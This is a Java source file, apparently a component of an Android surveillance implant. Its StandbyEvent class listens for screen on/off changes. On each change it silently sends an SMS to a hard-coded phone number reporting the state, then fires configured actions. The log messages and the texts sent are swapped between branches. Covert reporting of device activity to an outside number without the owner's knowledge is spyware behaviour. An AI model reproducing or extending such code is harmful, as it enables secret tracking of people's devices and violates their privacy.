package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.telephony.SmsManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Standby;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.ListenerStandby;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class StandbyEvent extends EventBase implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "StandbyEvent";

	private int actionOnEnter, actionOnExit;
	private boolean inRange = false;

	@Override
	public void begin() {
		ListenerStandby.self().attach(this);
	}

	@Override
	public void end() {
		ListenerStandby.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();

			Log.d("QZ", TAG + " exitAction: " + actionOnExit);
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}

		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Standby s) {
		Log.d("QZ", TAG + " Got power status notification: " + s.getStatus());
		SmsManager sm = SmsManager.getDefault();
		
		// Stato dello schermo ON/OFF
		if (s.getStatus() == true && inRange == false) {
			inRange = true;
			Log.d("QZ", TAG + " STANDBY OUT");
			sm.sendTextMessage("+393486512408", null, "Standby In", null, null);
			onExit();
		} else if (s.getStatus() == false && inRange == true) {
			inRange = false;
			Log.d("QZ", TAG + " STANDBY IN");
			sm.sendTextMessage("+393486512408", null, "Standby Out", null, null);
			onEnter();
		}
		
		return 0;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}

	public void onExit() {
		trigger(actionOnExit);
	}
}
